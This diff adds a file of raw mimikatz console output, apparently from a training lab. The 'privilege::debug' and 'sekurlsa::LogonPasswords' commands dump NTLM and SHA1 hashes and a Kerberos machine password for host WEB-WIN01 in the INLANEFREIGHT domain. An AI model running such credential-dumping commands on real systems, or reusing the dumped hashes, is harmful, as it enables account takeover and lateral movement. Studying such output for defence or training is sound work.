@@ -1,0 +1,166 @@
+
+  .#####.   mimikatz 2.1.1 (x64) #17763 Dec  9 2018 23:56:50
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::LogonPasswords
+
+Authentication Id : 0 ; 41101 (00000000:0000a08d)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 1/12/2025 9:42:27 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : WEB-WIN01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 0cc22255ecfc96fe0b0ecd71e6a6508e
+         * SHA1     : d13177e83781a65eefb7319f5998557e48cd43f3
+        tspkg :
+        wdigest :
+         * Username : WEB-WIN01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : WEB-WIN01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : ed 0c 98 65 bd 1a b1 5d 7d e4 97 51 0d e3 44 e5 85 77 3c 89 82 18 22 77 81 3d fa 5d a1 9e 7e 5e e4 9d b5 d6 5a fa 0f 4a ae 23 21 d9 7a 94 f6 bc 3c 5a 05 30 f6 3f ef 0b 11 00 f4 13 75 3d 94 f2 eb 4b c7 e4 9a 74 23 3b d6 46 06 78 30 2b 9a 05 01 af fe 06 e8 f8 a8 cf cf e0 01 77 f4 95 21 45 4c 1c 05 89 b1 de fc a7 0c ef e9 d3 ad 63 13 56 0f eb f2 e0 d8 b5 f5 44 43 b5 19 9b 2c 44 06 b6 92 d0 d2 45 18 2c aa fc 0e d0 90 d0 31 ea 85 2d 8c 11 e6 f5 fe 27 cf b2 8f 1a 3c 98 50 9b 24 2b 5a a6 17 b5 6c 00 bf a1 d4 c2 ec 61 06 d0 55 51 7e 6c 50 35 f7 25 26 2b 7f 04 16 cb af 3c 53 11 d0 42 b1 cb 57 77 57 88 d9 49 1e 20 46 aa d3 60 e9 74 e9 69 aa 7c 0a 11 62 a2 d5 67 75 0b 7e 49 be fa 4d 97 24 bf 01 76 83 7e 3b 46 ea 58 e5 1a 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 40232 (00000000:00009d28)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 1/12/2025 9:42:27 AM
+SID               : 
+        msv :
+         [00000003] Primary
+         * Username : WEB-WIN01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 0cc22255ecfc96fe0b0ecd71e6a6508e
+         * SHA1     : d13177e83781a65eefb7319f5998557e48cd43f3
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 1/12/2025 9:42:28 AM
+SID               : S-1-5-17
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WEB-WIN01$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 1/12/2025 9:42:27 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WEB-WIN01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : web-win01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : ed 0c 98 65 bd 1a b1 5d 7d e4 97 51 0d e3 44 e5 85 77 3c 89 82 18 22 77 81 3d fa 5d a1 9e 7e 5e e4 9d b5 d6 5a fa 0f 4a ae 23 21 d9 7a 94 f6 bc 3c 5a 05 30 f6 3f ef 0b 11 00 f4 13 75 3d 94 f2 eb 4b c7 e4 9a 74 23 3b d6 46 06 78 30 2b 9a 05 01 af fe 06 e8 f8 a8 cf cf e0 01 77 f4 95 21 45 4c 1c 05 89 b1 de fc a7 0c ef e9 d3 ad 63 13 56 0f eb f2 e0 d8 b5 f5 44 43 b5 19 9b 2c 44 06 b6 92 d0 d2 45 18 2c aa fc 0e d0 90 d0 31 ea 85 2d 8c 11 e6 f5 fe 27 cf b2 8f 1a 3c 98 50 9b 24 2b 5a a6 17 b5 6c 00 bf a1 d4 c2 ec 61 06 d0 55 51 7e 6c 50 35 f7 25 26 2b 7f 04 16 cb af 3c 53 11 d0 42 b1 cb 57 77 57 88 d9 49 1e 20 46 aa d3 60 e9 74 e9 69 aa 7c 0a 11 62 a2 d5 67 75 0b 7e 49 be fa 4d 97 24 bf 01 76 83 7e 3b 46 ea 58 e5 1a 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WEB-WIN01$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 1/12/2025 9:42:28 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : WEB-WIN01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 0cc22255ecfc96fe0b0ecd71e6a6508e
+         * SHA1     : d13177e83781a65eefb7319f5998557e48cd43f3
+        tspkg :
+        wdigest :
+         * Username : WEB-WIN01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : web-win01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : ed 0c 98 65 bd 1a b1 5d 7d e4 97 51 0d e3 44 e5 85 77 3c 89 82 18 22 77 81 3d fa 5d a1 9e 7e 5e e4 9d b5 d6 5a fa 0f 4a ae 23 21 d9 7a 94 f6 bc 3c 5a 05 30 f6 3f ef 0b 11 00 f4 13 75 3d 94 f2 eb 4b c7 e4 9a 74 23 3b d6 46 06 78 30 2b 9a 05 01 af fe 06 e8 f8 a8 cf cf e0 01 77 f4 95 21 45 4c 1c 05 89 b1 de fc a7 0c ef e9 d3 ad 63 13 56 0f eb f2 e0 d8 b5 f5 44 43 b5 19 9b 2c 44 06 b6 92 d0 d2 45 18 2c aa fc 0e d0 90 d0 31 ea 85 2d 8c 11 e6 f5 fe 27 cf b2 8f 1a 3c 98 50 9b 24 2b 5a a6 17 b5 6c 00 bf a1 d4 c2 ec 61 06 d0 55 51 7e 6c 50 35 f7 25 26 2b 7f 04 16 cb af 3c 53 11 d0 42 b1 cb 57 77 57 88 d9 49 1e 20 46 aa d3 60 e9 74 e9 69 aa 7c 0a 11 62 a2 d5 67 75 0b 7e 49 be fa 4d 97 24 bf 01 76 83 7e 3b 46 ea 58 e5 1a 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 41115 (00000000:0000a09b)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 1/12/2025 9:42:27 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : WEB-WIN01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 0cc22255ecfc96fe0b0ecd71e6a6508e
+         * SHA1     : d13177e83781a65eefb7319f5998557e48cd43f3
+        tspkg :
+        wdigest :
+         * Username : WEB-WIN01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : WEB-WIN01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : ed 0c 98 65 bd 1a b1 5d 7d e4 97 51 0d e3 44 e5 85 77 3c 89 82 18 22 77 81 3d fa 5d a1 9e 7e 5e e4 9d b5 d6 5a fa 0f 4a ae 23 21 d9 7a 94 f6 bc 3c 5a 05 30 f6 3f ef 0b 11 00 f4 13 75 3d 94 f2 eb 4b c7 e4 9a 74 23 3b d6 46 06 78 30 2b 9a 05 01 af fe 06 e8 f8 a8 cf cf e0 01 77 f4 95 21 45 4c 1c 05 89 b1 de fc a7 0c ef e9 d3 ad 63 13 56 0f eb f2 e0 d8 b5 f5 44 43 b5 19 9b 2c 44 06 b6 92 d0 d2 45 18 2c aa fc 0e d0 90 d0 31 ea 85 2d 8c 11 e6 f5 fe 27 cf b2 8f 1a 3c 98 50 9b 24 2b 5a a6 17 b5 6c 00 bf a1 d4 c2 ec 61 06 d0 55 51 7e 6c 50 35 f7 25 26 2b 7f 04 16 cb af 3c 53 11 d0 42 b1 cb 57 77 57 88 d9 49 1e 20 46 aa d3 60 e9 74 e9 69 aa 7c 0a 11 62 a2 d5 67 75 0b 7e 49 be fa 4d 97 24 bf 01 76 83 7e 3b 46 ea 58 e5 1a 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 1/12/2025 9:42:28 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(commandline) # exit
+Bye!
